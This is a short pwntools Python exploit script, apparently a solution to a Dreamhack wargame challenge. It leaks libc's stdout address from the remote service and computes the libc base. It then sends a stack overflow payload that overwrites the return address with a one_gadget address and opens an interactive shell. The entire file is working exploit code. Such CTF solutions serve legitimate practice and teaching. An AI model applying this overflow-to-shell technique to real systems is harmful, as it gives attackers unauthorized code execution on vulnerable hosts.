from pwn import *


def main():
    proc = process(["one_gadget", "./libc.so.6"])
    one_gadget = proc.recvline().decode()
    one_gadget = one_gadget[one_gadget.find("0x")+2:]
    one_gadget = one_gadget[:one_gadget.find("\x1b")]
    one_gadget = int(one_gadget, 16)
    proc.close()

    libc = ELF("./libc.so.6", checksec=False);
    libc_stdout_offset = libc.symbols["_IO_2_1_stdout_"]

    proc = remote("host1.dreamhack.games", 16075)
    proc.recvuntil(b"stdout: ")
    stdout_addr = proc.recvline(False).decode()
    stdout_addr = int(stdout_addr, 16)

    libc_base = stdout_addr - libc_stdout_offset

    payload = b"A"*0x18
    payload += p64(0)
    payload += b"B"*8
    payload += p64(libc_base + one_gadget)

    proc.send(payload)
    proc.interactive()

if __name__ == "__main__":
    main()
